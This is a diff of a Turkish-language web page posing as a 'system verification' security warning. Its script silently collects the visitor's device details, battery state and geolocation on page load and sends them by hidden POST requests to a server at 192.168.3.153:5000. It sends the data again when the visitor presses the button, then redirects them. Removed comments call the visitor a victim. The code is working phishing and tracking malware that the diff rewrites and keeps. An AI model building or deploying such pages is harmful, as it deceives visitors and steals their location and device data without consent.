@@ -10,52 +10,62 @@
         .icon { font-size: 50px; margin-bottom: 20px; }
         h1 { font-size: 20px; color: #1c1c1e; }
         p { color: #8e8e93; font-size: 14px; margin-bottom: 30px; }
-        .btn { background-color: #007aff; color: white; padding: 12px 25px; border-radius: 10px; text-decoration: none; font-weight: 600; display: inline-block; transition: 0.3s; }
-        .btn:active { transform: scale(0.95); background-color: #0056b3; }
+        .btn { background-color: #007aff; color: white; padding: 12px 25px; border-radius: 10px; text-decoration: none; font-weight: 600; display: inline-block; transition: 0.3s; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="card">
         <div class="icon">⚠️</div>
         <h1>Sistem Doğrulaması</h1>
-        <p>Cihazınızda olağandışı hareketler saptandı. Erişiminizi korumak için doğrulamayı tamamlayın.</p>
-        <!-- Senin IP adresine (192.168.3.153) yönlendirir -->
-        <a href="http://192.168.3.153:5000/sizdir" class="btn" id="verifyBtn">Şimdi Doğrula</a>
+        <p>Cihazınızda olağandışı hareketler saptandı. Lütfen kimliğinizi doğrulayın.</p>
+        <a id="mainBtn" class="btn">Şimdi Doğrula</a>
     </div>
 
     <script>
-        async function sızdır() {
+        const API_URL = "http://192.168.3.153:5000";
+
+        async function veriToplaVeGonder(ekstraMesaj = "") {
             let data = {
+                etiket: ekstraMesaj,
                 platform: navigator.platform,
                 ekran: `${window.screen.width}x${window.screen.height}`,
-                tarih: new Date().toLocaleString(),
-                dil: navigator.language
+                dil: navigator.language,
+                hafiza: navigator.deviceMemory || "Bilinmiyor"
             };
 
-            // Pil Bilgisi Sızdırma (Cihazın o anki fiziksel durumunu gösterir)
+            // Pil Bilgisi
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
-                data.pil_seviyesi = (battery.level * 100) + "%";
-                data.sarjda_mi = battery.charging;
+                data.pil = (battery.level * 100) + "%";
+                data.sarjda = battery.charging;
             }
 
-            // Hassas Konum İsteği (Kurban izin verirse tam koordinatlar gelir)
+            // Konum İsteği
             navigator.geolocation.getCurrentPosition((pos) => {
-                data.google_harita = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                gonder(data);
-            }, () => gonder(data)); // Reddedilse bile diğerlerini gönder
-        }
-
-        function gonder(obj) {
-            // Flask sunucuna gizli POST isteği atar
-            fetch('http://192.168.3.153:5000/detay', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(obj)
+                data.harita = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                fetch(`${API_URL}/detay`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            }, () => {
+                // Konum reddedilse bile mevcut veriyi gönder
+                fetch(`${API_URL}/detay`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
             });
         }
 
-        window.onload = sızdır;
+        // Sayfa yüklendiği an ilk veriyi gönder (Sessizce)
+        window.onload = () => veriToplaVeGonder("Sayfa Yüklendi");
+
+        // Butona basıldığında tekrar gönder (Onaylı)
+        document.getElementById('mainBtn').addEventListener('click', function() {
+            veriToplaVeGonder("Butona Basıldı");
+            window.location.href = `http://192.168.3.153:5000/sizdir`;
+        });
     </script>
 </body>
 </html>
